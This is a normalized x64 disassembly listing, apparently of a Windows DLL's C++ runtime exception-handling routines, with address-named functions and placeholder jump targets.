mov [ rsp + 0x28 ] rax
call sub_180010a54
inc [ rax + 0x100 ]
call sub_180010a54
cmp [ rax + 0x100 ] 0x0
jle r-xdata
cmp edi r13d
jle r-xdata
cmp edi 0xffffffff
je r-xdata
call sub_180010a54
dec [ rax + 0x100 ]
cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx rbx
mov rcx r14
call sub_18001f698
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_180019758
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_180019758
movsxd r12 edi
call sub_18001e290
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_18001e290
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_18001e290
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18001e290
add rax rbx
mov rbx [ rsp + 0x78 ]
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx rbx
mov rcx r14
call sub_18001f698
call sub_18001e290
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
mov rbx [ rsp + 0x78 ]
jmp r-xdata
xor eax eax
call sub_18001e290
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18001e290
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_180023320
mov rcx r15
call sub_18001e2c0
sub_18001fa5c
mov [ rsp + 0x10 ] dl
sub rsp 0x28
xor eax eax
cmp rcx rax
je r-xdata
add rsp 0x28
retn
cmp [ rcx ] 0xe06d7363
jne r-xdata
mov rdx [ rcx + 0x30 ]
cmp rdx rax
je r-xdata
cmp [ rdx + 0x4 ] eax
je r-xdata
movsxd rax [ rdx + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_18001fac4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_180019758
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_18001e2a8
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_18001e2a8
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_18001e2a8
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_18001e290
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_18001f758
test eax eax
jne r-xdata
jmp r-xdata
sub_18001fb98
push rbx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x98
mov rdi rcx
xor r14d r14d
mov [ rsp + 0x20 ] r14d
and [ rsp + 0xd0 ] r14d
and [ rsp + 0x48 ] r14
and [ rsp + 0x40 ] r14
call sub_180010a54
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xe8 ] rax
call sub_180010a54
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xe0 ] rax
mov r12 [ rdi + 0x50 ]
mov [ rsp + 0xd8 ] r12
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov rax [ rdi + 0x30 ]
mov [ rsp + 0x58 ] rax
mov r13 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r13
call sub_180010a54
mov [ rax + 0xf0 ] r12
call sub_180010a54
mov [ rax + 0xf8 ] rbx
call sub_180010a54
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x78 ]
call sub_18001e64c
mov r15 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r14
je r-xdata
mov r8d 0x100
mov rdx r13
mov rcx [ rsp + 0x58 ]
call sub_180023320
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xe8 ]
jmp r-xdata
mov [ rsp + 0xd0 ] 0x1
call sub_180010a54
mov rbx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rbx
call sub_180010a54
mov [ rax + 0xf0 ] rbx
mov rcx r15
call sub_18001e6c4
test r14d r14d
jne r-xdata
call sub_180010a54
mov rcx [ rsp + 0xe0 ]
mov [ rax + 0xf0 ] rcx
call sub_180010a54
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r13 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x98
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rbx
retn
mov r8d 0xe06d7363
cmp [ r12 ] r8d
jne r-xdata
cmp [ r12 + 0x18 ] 0x4
jne r-xdata
cmp [ r12 + 0x20 ] 0x19930520
je r-xdata
mov rcx [ r12 + 0x28 ]
call sub_18001e690
test eax eax
je r-xdata
cmp [ r12 + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx r12
call sub_18001fa5c
cmp [ r12 + 0x20 ] 0x19930522
jne r-xdata
sub_18001fcaa
mov [ rsp + 0x20 ] 0x1
call sub_180010a54
and [ rax + 0x2c0 ] 0x0
cmp [ rsp + 0xd0 ] 0x0
je r-xdata
mov r12 [ rsp + 0xd8 ]
lea r9 [ r12 + 0x20 ]
mov r8d [ r12 + 0x18 ]
mov edx [ r12 + 0x4 ]
mov ecx [ r12 ]
call [ RaiseException@IAT ]
mov dl 0x1
mov r12 [ rsp + 0xd8 ]
mov rcx r12
call sub_18001fa5c
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
call [ RaiseException@IAT ]
jmp r-xdata
call sub_180010a54
mov rcx [ rsp + 0xe0 ]
mov [ rax + 0xf0 ] rcx
call sub_180010a54
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r13 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x98
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rbx
retn
mov r8d 0xe06d7363
cmp [ r12 ] r8d
jne r-xdata
mov r14d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xe8 ]
mov r13 [ rsp + 0x60 ]
mov r15 [ rsp + 0x50 ]
mov rcx r15
call sub_18001e6c4
test r14d r14d
jne r-xdata
cmp [ r12 + 0x18 ] 0x4
jne r-xdata
cmp [ r12 + 0x20 ] 0x19930520
je r-xdata
mov rcx [ r12 + 0x28 ]
call sub_18001e690
test eax eax
je r-xdata
cmp [ r12 + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx r12
call sub_18001fa5c
cmp [ r12 + 0x20 ] 0x19930522
jne r-xdata
sub_18001fdd8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
cmp r13d ebx
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_18001e290
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
cmp r13d ebx
je r-xdata
cmp r11 rbx
je r-xdata
mov r11 rbx
call sub_18001e290
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
bt [ rdi ] 0x1f
jb r-xdata
bt [ rdi ] 0x1f
jae r-xdata
test [ rdi ] 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
mov edi 0x1
test [ rsi ] dil
je r-xdata
mov edi 0x1
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180021018
cmp eax ebx
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180021018
cmp eax ebx
je r-xdata
call sub_180019758
mov edx edi
mov rcx r12
call sub_180021018
cmp eax ebx
je r-xdata
mov r11 rbx
call sub_18001e2a8
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
call sub_180019758
mov edx edi
mov rcx r12
call sub_180021018
cmp eax ebx
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
lea rdx [ rsi + 0x8 ]
call sub_18001faa0
mov [ r12 ] rax
jmp r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180021018
cmp eax ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180021018
cmp eax ebx
je r-xdata
cmp r11 rbx
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_1800160e0
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
call sub_180019758
mov edx edi
mov rcx r12
call sub_180021018
cmp eax ebx
je r-xdata
call sub_180019758
mov edx edi
mov rcx r12
call sub_180021018
cmp eax ebx
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_18001faa0
mov rdx rax
mov r8 r10
mov rcx r12
call sub_1800160e0
jmp r-xdata
lea rdx [ rsi + 0x8 ]
mov rcx [ r12 ]
call sub_18001faa0
mov [ r12 ] rax
jmp r-xdata
mov rcx rbx
call sub_18001e2a8
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_180021018
cmp eax ebx
je r-xdata
sub_180020000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
bt [ r8 ] 0x1f
jae r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
cmp eax 0x1
jne r-xdata
call sub_18001fdd8
sub eax 0x1
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18001faa0
mov rdx rax
mov rcx rdi
call r10
call sub_18001e2a8
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18001faa0
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_18001e2a8
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_1800200b0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_18001e1a4
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_18001e290
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xd8 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_18001e724
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_180020000
sub_180020174
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x70
cmp [ rcx ] 0x80000003
mov r13 r9
mov rdi r8
mov r14 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xb8 ]
add rsp 0x70
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_180010a54
mov r15d [ rsp + 0xe0 ]
mov rbp [ rsp + 0xd0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_180010a54
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xd8 ]
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xb0 ]
mov r8d r15d
mov r9d r12d
mov rdx rbp
mov rcx r14
mov [ rsp + 0x20 ] rax
call sub_18001e524
mov rdi rax
mov eax [ rsp + 0xb0 ]
jmp r-xdata
call sub_180019758
cmp [ rsi ] 0xe0434f4d
je r-xdata
cmp eax [ rsp + 0x60 ]
jb r-xdata
mov rax [ rsp + 0xe8 ]
mov r9 r13
mov r8 rdi
mov [ rsp + 0x30 ] rax
mov rdx r14
mov rcx rsi
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] rbp
call sub_18001e4d0
test eax eax
jne r-xdata
cmp r12d [ rdi ]
jl r-xdata
inc eax
add rdi 0x14
mov [ rsp + 0xb0 ] eax
cmp r12d [ rdi + 0x4 ]
jg r-xdata
call sub_18001e290
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_18001e290
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_18001e290
add rax rbx
jmp r-xdata
call sub_18001e290
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_18001e290
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov eax [ rsp + 0xb0 ]
call sub_18001e290
mov ecx [ rdi + 0xc ]
mov r8 [ rsp + 0xc0 ]
mov [ rsp + 0x58 ] 0x0
mov [ rsp + 0x50 ] 0x1
dec ecx
movsxd rcx ecx
mov r9 r13
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x10 ]
mov rdx r14
add rcx rax
mov rax [ rsp + 0xe8 ]
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x40 ] r15d
mov [ rsp + 0x38 ] rdi
and [ rsp + 0x30 ] 0x0
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_1800200b0
xor eax eax
call sub_18001e290
movsxd rcx [ rdi + 0xc ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x10 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_18001e290
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_1800203b8
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0xa0
mov rbx [ rsp + 0x100 ]
xor r15d r15d
mov r12 rdx
mov rdi rcx
mov rdx r9
mov rcx rbx
mov r13 r9
mov rbp r8
mov [ rsp + 0x60 ] r15b
mov r14b r15b
mov [ rsp + 0xe0 ] r15b
call sub_18001f668
lea r9 [ rsp + 0x78 ]
mov r8 rbx
mov rdx r13
mov rcx r12
mov esi eax
call sub_18001e1a4
mov r8 rbx
mov rdx r13
mov rcx r12
call sub_18001f6e0
mov r8 rbx
mov rdx r13
cmp esi eax
jle r-xdata
mov rcx r12
call sub_18001f6e0
mov esi eax
lea rcx [ rsp + 0x78 ]
mov r9d esi
call sub_18001f698
mov r9d esi
mov r8 rbx
mov rdx r13
mov rcx r12
call sub_18001f6a4
jmp r-xdata
call sub_180019758
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] r15d
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_180010a54
cmp [ rax + 0x108 ] r15
je r-xdata
cmp [ rsp + 0x108 ] r15b
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xf8 ]
add rsp 0xa0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_180019758
call sub_180019734
mov rax [ rsp + 0x118 ]
mov r9 r13
mov r8 rbp
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x110 ]
mov rdx r12
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_180020174
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] r15
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_180010a54
cmp [ rax + 0xf0 ] r15
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] r15d
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_180010a54
mov rdi [ rax + 0xf0 ]
call sub_180010a54
mov rcx [ rdi + 0x38 ]
mov rbp [ rax + 0xf8 ]
mov [ rsp + 0x60 ] 0x1
mov [ rsp + 0xf0 ] rbp
call sub_18001e2dc
mov edx 0x1
mov rcx rdi
call sub_180021018
cmp eax r15d
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rsp + 0x110 ]
lea rax [ rsp + 0x68 ]
mov [ rsp + 0x30 ] r13
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x64 ]
mov r9d esi
mov rdx rbx
mov rcx r12
mov [ rsp + 0x20 ] rax
call sub_18001e524
mov ecx [ rsp + 0x64 ]
mov rbp rax
mov eax [ rsp + 0x68 ]
cmp ecx eax
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_180019758
mov esi [ rbx + 0x20 ]
cmp esi r15d
je r-xdata
cmp [ rbp ] esi
jg r-xdata
call sub_180010a54
cmp [ rax + 0x108 ] r15
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
mov rax r15
movsxd rsi esi
call sub_18001e290
add rax rsi
jmp r-xdata
inc ecx
add rbp 0x14
mov [ rsp + 0x64 ] ecx
cmp ecx eax
jb r-xdata
cmp esi [ rbp + 0x4 ]
jg r-xdata
call sub_180010a54
mov rbp [ rax + 0x108 ]
call sub_180010a54
mov rdx rbp
mov rcx rdi
mov [ rax + 0x108 ] r15
call sub_18001fac4
cmp al r15b
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
cmp esi r15d
je r-xdata
cmp rax r15
je r-xdata
cmp r14b r15b
jne r-xdata
call sub_18001e290
movsxd r12 [ rbp + 0x10 ]
mov r14d [ rbp + 0xc ]
add r12 rax
mov rbp [ rsp + 0xf0 ]
cmp [ rbp ] r15d
mov r12d r15d
jle r-xdata
cmp [ rdi + 0x30 ] r15
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
mov rdx r15
call sub_18001e290
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rsp + 0xe0 ]
mov r12 [ rsp + 0xe8 ]
call sub_18001e2a8
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rsp + 0x70 ] rax
call sub_18001e2a8
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov r15d [ rax + rdx ]
jmp r-xdata
call sub_180019734
mov rsi r15
call sub_180019758
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rsp + 0xe0 ]
mov r8 rbx
mov rdx r13
mov rcx r12
call sub_18001e1a4
mov cl [ rsp + 0x108 ]
mov r8 [ rsp + 0xf0 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r13
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
mov r9 rax
mov rdx rdi
mov rcx r12
mov [ rsp + 0x20 ] r15
call sub_18001e724
mov rcx rdi
call sub_18001fac4
cmp al r15b
jne r-xdata
test r15d r15d
jg r-xdata
mov rax r15
call sub_18001e290
movsxd rcx [ rbp + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18001e290
add rax rbx
jmp r-xdata
call sub_18001e2a8
mov rcx [ rsp + 0x70 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r12
mov rdx rax
mov [ rsp + 0x80 ] rax
call sub_18001f758
test eax eax
jne r-xdata
dec r14d
add r12 0x14
xor r15d r15d
jmp r-xdata
mov dl 0x1
mov rcx rdi
call sub_18001fa5c
lea r11 [ r--data ]
lea rdx [ rsp + 0xe0 ]
lea rcx [ rsp + 0x88 ]
mov [ rsp + 0xe0 ] r11
call sub_180013360
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x88 ]
mov [ rsp + 0x88 ] r11
call sub_180013514
int3
inc r12d
add rsi 0x14
cmp r12d [ rbp ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_18000db88
cmp al r15b
jne r-xdata
mov al [ rsp + 0x108 ]
mov r8 [ rsp + 0xf0 ]
mov r14b 0x1
mov [ rsp + 0x58 ] al
mov al [ rsp + 0x60 ]
mov r9 r13
mov [ rsp + 0x50 ] al
mov rax [ rsp + 0x118 ]
mov rcx rdi
mov [ rsp + 0x48 ] rax
mov eax [ rsp + 0x110 ]
mov [ rsp + 0xe0 ] r14b
mov [ rsp + 0x40 ] eax
mov rax [ rsp + 0x80 ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r12
mov r12 [ rsp + 0xe8 ]
mov rdx r12
mov [ rsp + 0x20 ] rbx
call sub_1800200b0
xor r15d r15d
jmp r-xdata
dec r15d
add [ rsp + 0x70 ] 0x4
cmp r14d r15d
jle r-xdata
call sub_18001e290
movsxd rcx [ rbp + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] r15d
je r-xdata
mov eax [ rsp + 0x68 ]
mov ecx [ rsp + 0x64 ]
sub_180020938
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_180010a54
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_1800203b8
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_18001e290
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_18001e2f8
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_18001f5dc
cmp eax 0xffffffff
mov ebx eax
jl r-xdata
xor r11d r11d
call sub_18001e2a8
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_180019758
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_180019758
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_18001f8c8
jmp r-xdata
sub_180020b60
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
cmp al r8b
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_180020b88
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x78 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rsp + 0x40 ]
mov rdx r8
call sub_18000d428
lea r11 [ rsp + 0x40 ]
lea rdx [ rsp + 0x60 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rsp + 0x68 ]
xor r9d r9d
mov r8 rbx
call sub_180021c2c
lea rcx [ rsp + 0x68 ]
mov rdx rdi
mov ebx eax
call sub_180021024
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
